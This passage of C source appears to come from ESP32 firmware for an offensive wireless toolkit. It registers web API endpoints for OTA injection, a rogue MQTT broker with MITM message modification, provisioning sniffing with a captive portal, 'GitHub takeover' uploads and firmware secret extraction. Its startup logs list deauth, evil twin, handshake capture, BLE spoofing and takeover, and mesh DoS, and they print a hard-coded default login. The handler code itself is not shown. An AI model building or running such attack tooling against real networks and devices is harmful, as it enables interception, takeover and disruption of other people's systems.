        httpd_uri_t ota_inject_start_uri = { .uri = "/api/ota/inject/start", .method = HTTP_POST, .handler = ota_inject_start_handler };
        httpd_register_uri_handler(server, &ota_inject_start_uri);
        httpd_uri_t ota_fetch_start_uri = { .uri = "/api/ota/fetch/start", .method = HTTP_POST, .handler = ota_fetch_start_handler };
        httpd_register_uri_handler(server, &ota_fetch_start_uri);
        httpd_uri_t ota_poll_start_uri = { .uri = "/api/ota/poll/start", .method = HTTP_POST, .handler = ota_poll_start_handler };
        httpd_register_uri_handler(server, &ota_poll_start_uri);
        httpd_uri_t ota_prov_start_uri = { .uri = "/api/ota/prov/start", .method = HTTP_POST, .handler = ota_provision_start_handler };
        httpd_register_uri_handler(server, &ota_prov_start_uri);
        httpd_uri_t ota_rb_start_uri = { .uri = "/api/ota/rogue-broker/start", .method = HTTP_POST, .handler = ota_rogue_broker_start_handler };
        httpd_register_uri_handler(server, &ota_rb_start_uri);
        httpd_uri_t ota_fw_start_uri = { .uri = "/api/ota/firmware/start", .method = HTTP_POST, .handler = ota_firmware_start_handler };
        httpd_register_uri_handler(server, &ota_fw_start_uri);
        httpd_uri_t ota_gh_start_uri = { .uri = "/api/ota/github/start", .method = HTTP_POST, .handler = ota_github_start_handler };
        httpd_register_uri_handler(server, &ota_gh_start_uri);

        httpd_uri_t ota_start_uri = { .uri = "/api/ota/start", .method = HTTP_POST, .handler = ota_start_handler };
        httpd_register_uri_handler(server, &ota_start_uri);
        httpd_uri_t ota_stop_uri = { .uri = "/api/ota/stop", .method = HTTP_POST, .handler = ota_stop_handler };
        httpd_register_uri_handler(server, &ota_stop_uri);
        httpd_uri_t ota_status_uri = { .uri = "/api/ota/status", .method = HTTP_GET, .handler = ota_status_handler };
        httpd_register_uri_handler(server, &ota_status_uri);
        httpd_uri_t ota_messages_uri = { .uri = "/api/ota/messages", .method = HTTP_GET, .handler = ota_messages_handler };
        httpd_register_uri_handler(server, &ota_messages_uri);
        httpd_uri_t ota_urls_uri = { .uri = "/api/ota/urls", .method = HTTP_GET, .handler = ota_urls_handler };
        httpd_register_uri_handler(server, &ota_urls_uri);
        httpd_uri_t ota_github_urls_uri = { .uri = "/api/ota/github/urls", .method = HTTP_GET, .handler = ota_github_urls_handler };
        httpd_register_uri_handler(server, &ota_github_urls_uri);
        httpd_uri_t ota_inject_uri = { .uri = "/api/ota/inject", .method = HTTP_POST, .handler = ota_inject_handler };
        httpd_register_uri_handler(server, &ota_inject_uri);
        httpd_uri_t ota_download_uri = { .uri = "/api/ota/download", .method = HTTP_POST, .handler = ota_download_handler };
        httpd_register_uri_handler(server, &ota_download_uri);
        httpd_uri_t ota_download_result_uri = { .uri = "/api/ota/download/result", .method = HTTP_GET, .handler = ota_download_result_handler };
        httpd_register_uri_handler(server, &ota_download_result_uri);
        httpd_uri_t ota_dns_uri = { .uri = "/api/ota/dns", .method = HTTP_GET, .handler = ota_dns_handler };
        httpd_register_uri_handler(server, &ota_dns_uri);
        httpd_uri_t ota_http_uri = { .uri = "/api/ota/http", .method = HTTP_GET, .handler = ota_http_entries_handler };
        httpd_register_uri_handler(server, &ota_http_uri);
        /* OTA GitHub repo operations */
        httpd_uri_t ota_github_parse_uri = { .uri = "/api/ota/github/parse", .method = HTTP_POST, .handler = ota_github_parse_handler };
        httpd_register_uri_handler(server, &ota_github_parse_uri);
        httpd_uri_t ota_github_access_uri = { .uri = "/api/ota/github/access", .method = HTTP_POST, .handler = ota_github_access_handler };
        httpd_register_uri_handler(server, &ota_github_access_uri);
        httpd_uri_t ota_github_list_uri = { .uri = "/api/ota/github/list", .method = HTTP_GET, .handler = ota_github_list_handler };
        httpd_register_uri_handler(server, &ota_github_list_uri);
        httpd_uri_t ota_github_sha_uri = { .uri = "/api/ota/github/file-sha", .method = HTTP_POST, .handler = ota_github_file_sha_handler };
        httpd_register_uri_handler(server, &ota_github_sha_uri);
        httpd_uri_t ota_github_upload_uri = { .uri = "/api/ota/github/upload", .method = HTTP_POST, .handler = ota_github_upload_handler };
        httpd_register_uri_handler(server, &ota_github_upload_uri);
        httpd_uri_t ota_github_repo_uri = { .uri = "/api/ota/github/repo", .method = HTTP_GET, .handler = ota_github_repo_handler };
        httpd_register_uri_handler(server, &ota_github_repo_uri);
        httpd_uri_t ota_github_result_uri = { .uri = "/api/ota/github/result", .method = HTTP_GET, .handler = ota_github_result_handler };
        httpd_register_uri_handler(server, &ota_github_result_uri);
        httpd_uri_t ota_chain_uri = { .uri = "/api/ota/chain", .method = HTTP_POST, .handler = ota_chain_handler };
        httpd_register_uri_handler(server, &ota_chain_uri);

        /* OTA Provision Sniffer API */
        httpd_uri_t ota_prov_status_uri = { .uri = "/api/ota/prov/status", .method = HTTP_GET, .handler = ota_prov_status_handler };
        httpd_register_uri_handler(server, &ota_prov_status_uri);
        httpd_uri_t ota_prov_stop_uri = { .uri = "/api/ota/prov/stop", .method = HTTP_POST, .handler = ota_prov_stop_handler };
        httpd_register_uri_handler(server, &ota_prov_stop_uri);
        httpd_uri_t ota_prov_preview_uri = { .uri = "/api/ota/prov/preview", .method = HTTP_GET, .handler = ota_prov_preview_handler };
        httpd_register_uri_handler(server, &ota_prov_preview_uri);
        httpd_uri_t ota_prov_summary_uri = { .uri = "/api/ota/prov/summary", .method = HTTP_GET, .handler = ota_prov_summary_handler };
        httpd_register_uri_handler(server, &ota_prov_summary_uri);
        httpd_uri_t ota_prov_clear_uri = { .uri = "/api/ota/prov/clear", .method = HTTP_POST, .handler = ota_prov_clear_handler };
        httpd_register_uri_handler(server, &ota_prov_clear_uri);
        httpd_uri_t ota_prov_pcap_uri = { .uri = "/api/ota/prov/pcap", .method = HTTP_GET, .handler = ota_prov_pcap_handler };
        httpd_register_uri_handler(server, &ota_prov_pcap_uri);
        httpd_uri_t ota_prov_portal_build_uri = { .uri = "/api/ota/prov/portal/build", .method = HTTP_POST, .handler = ota_prov_portal_build_handler };
        httpd_register_uri_handler(server, &ota_prov_portal_build_uri);
        httpd_uri_t ota_prov_portal_meta_uri = { .uri = "/api/ota/prov/portal", .method = HTTP_GET, .handler = ota_prov_portal_meta_handler };
        httpd_register_uri_handler(server, &ota_prov_portal_meta_uri);
        httpd_uri_t ota_prov_portal_html_uri = { .uri = "/api/ota/prov/portal.html", .method = HTTP_GET, .handler = ota_prov_portal_html_handler };
        httpd_register_uri_handler(server, &ota_prov_portal_html_uri);
        httpd_uri_t ota_prov_apply_portal_uri = { .uri = "/api/ota/prov/portal/apply", .method = HTTP_POST, .handler = ota_prov_apply_portal_handler };
        httpd_register_uri_handler(server, &ota_prov_apply_portal_uri);

        /* OTA Rogue Broker API */
        httpd_uri_t ota_mitm_msgs_uri = { .uri = "/api/ota/mitm/messages", .method = HTTP_GET, .handler = ota_mitm_messages_handler };
        httpd_register_uri_handler(server, &ota_mitm_msgs_uri);
        httpd_uri_t ota_rb_summary_uri = { .uri = "/api/ota/rogue-broker/summary", .method = HTTP_GET, .handler = ota_rogue_broker_summary_handler };
        httpd_register_uri_handler(server, &ota_rb_summary_uri);
        httpd_uri_t ota_mitm_modify_uri = { .uri = "/api/ota/mitm/modify", .method = HTTP_POST, .handler = ota_mitm_modify_handler };
        httpd_register_uri_handler(server, &ota_mitm_modify_uri);
        httpd_uri_t ota_mitm_clear_uri = { .uri = "/api/ota/mitm/clear", .method = HTTP_POST, .handler = ota_mitm_clear_handler };
        httpd_register_uri_handler(server, &ota_mitm_clear_uri);

        /* OTA Firmware Analysis API */
        httpd_uri_t ota_fw_analyze_uri = { .uri = "/api/ota/firmware/analyze", .method = HTTP_POST, .handler = ota_fw_analyze_handler };
        httpd_register_uri_handler(server, &ota_fw_analyze_uri);
        httpd_uri_t ota_fw_secrets_uri = { .uri = "/api/ota/firmware/secrets", .method = HTTP_GET, .handler = ota_fw_secrets_handler };
        httpd_register_uri_handler(server, &ota_fw_secrets_uri);
        httpd_uri_t ota_fw_summary_uri = { .uri = "/api/ota/firmware/summary", .method = HTTP_GET, .handler = ota_fw_summary_handler };
        httpd_register_uri_handler(server, &ota_fw_summary_uri);
        httpd_uri_t ota_fw_clear_uri = { .uri = "/api/ota/firmware/clear", .method = HTTP_POST, .handler = ota_fw_clear_handler };
        httpd_register_uri_handler(server, &ota_fw_clear_uri);
        
        ESP_LOGI(TAG, "==========================================");
        ESP_LOGI(TAG, "Omega Solutions - Complete Security Suite v7.1");
        ESP_LOGI(TAG, "Web server started! Open http://192.168.4.1");
        ESP_LOGI(TAG, "Username: omega | Password: solutions123");
        ESP_LOGI(TAG, "WiFi: Deauth, Deauth Detect, Beacon, DoS, Handshake, PMKID, Probe, EvilTwin");
        ESP_LOGI(TAG, "OTA: Sniff, Client, Inject, Fetch, Poll Sniff, GitHub Takeover, Provision Sniff, Rogue Broker, Firmware Analyze");
        ESP_LOGI(TAG, "BLE: Spam, Scan, Spoof, Clone, Connect, L2CAP, GATT, Deauth, Passkey, Takeover");
        ESP_LOGI(TAG, "MESH: Scan, Sniff, Node Spoof, Packet Inject, MITM, DoS");
        ESP_LOGI(TAG, "==========================================");
    } else {
        ESP_LOGE(TAG, "FAILED to start web server! Free heap: %u bytes. "
                  "Start web server before BLE init (see main.c) or reduce "
                  "CONFIG_ESP_MAIN_TASK_STACK_SIZE / WiFi buffers in sdkconfig.",
                  (unsigned)esp_get_free_heap_size());
    }
}

void webserver_stop(void) {
    if (server_handle != NULL) {
        httpd_stop(server_handle);
        server_handle = NULL;
        ESP_LOGI(TAG, "Web server stopped.");
    }
}

void webserver_run(void) {
    if (server_handle == NULL) {
        start_web_server();
    }
}